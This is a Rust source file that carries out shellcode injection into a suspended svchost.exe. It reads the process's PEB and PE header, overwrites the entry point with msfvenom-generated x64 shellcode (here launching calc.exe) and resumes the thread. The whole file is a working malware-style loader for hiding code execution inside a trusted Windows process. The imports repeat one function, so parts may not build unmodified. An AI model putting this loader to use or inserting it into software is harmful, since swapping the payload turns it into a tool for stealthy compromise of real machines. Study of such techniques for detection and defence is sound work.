use std::{
    ffi::c_void,
    mem::{zeroed, size_of},
    ptr::null_mut,
};
use windows_sys::{
    Win32::Foundation::CloseHandle,
    Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
    Win32::System::Threading::{
        CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION,
        PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
    },
    Wdk::System::Threading::NtQueryInformationProcess,
};

fn main() {
    unsafe {
        // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
        let shellcode: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
            0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
            0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
            0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,
            0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,
            0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,
            0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,
            0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,
            0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
            0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
            0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,
            0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
            0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,
            0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
            0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,
            0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,
            0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,
            0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,
            0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,
            0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,
            0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
            0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
            0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
            0x2e,0x65,0x78,0x65,0x00];

        let application_name = "C:\\Windows\\System32\\svchost.exe\0";

        let startup_info: STARTUPINFOA = zeroed();
        let mut process_information: PROCESS_INFORMATION = zeroed();

        CreateProcessA(application_name.as_ptr(), null_mut(), null_mut(), null_mut(), 0, CREATE_SUSPENDED, null_mut(), null_mut(), &startup_info, &mut process_information);
        let handle_process = process_information.hProcess;
        let handle_thread = process_information.hThread;

        let mut process_basic_information: PROCESS_BASIC_INFORMATION = zeroed();
        let mut return_length:u32 = 0;
        NtQueryInformationProcess(handle_process, 0, &mut process_basic_information as *mut _ as *mut c_void, size_of::<PROCESS_BASIC_INFORMATION>() as u32, &mut return_length);

        let peb_base = process_basic_information.PebBaseAddress as u64;
        let image_base_offset = 0x10;
        let mut image_base_addr: [u8; 8] = [0; 8];
        let mut bytes_read: usize = 0;
        ReadProcessMemory(process_information.hProcess, (peb_base + image_base_offset) as *const _, image_base_addr.as_mut_ptr() as *mut _, image_base_addr.len(), &mut bytes_read);

        let image_base = u64::from_ne_bytes(image_base_addr);
        let mut pe_header: [u8; 512] = [0; 512];
        ReadProcessMemory(process_information.hProcess, image_base as *const _, pe_header.as_mut_ptr() as *mut _, pe_header.len(), &mut bytes_read);

        let e_lfanew = u32::from_le_bytes(pe_header[0x3C..0x40].try_into().unwrap()) as usize;
        let entry_point_rva = u32::from_le_bytes(pe_header[e_lfanew + 0x28..e_lfanew + 0x2C].try_into().unwrap()) as u64;
        let entry_point_va = image_base + entry_point_rva;

        let mut number_of_bytes_written: usize = 0;
        WriteProcessMemory(process_information.hProcess, entry_point_va as *const _, shellcode.as_ptr() as *const _, shellcode.len(), &mut number_of_bytes_written);

        ResumeThread(handle_thread);

        CloseHandle(handle_process);
        CloseHandle(handle_thread);
    }
}
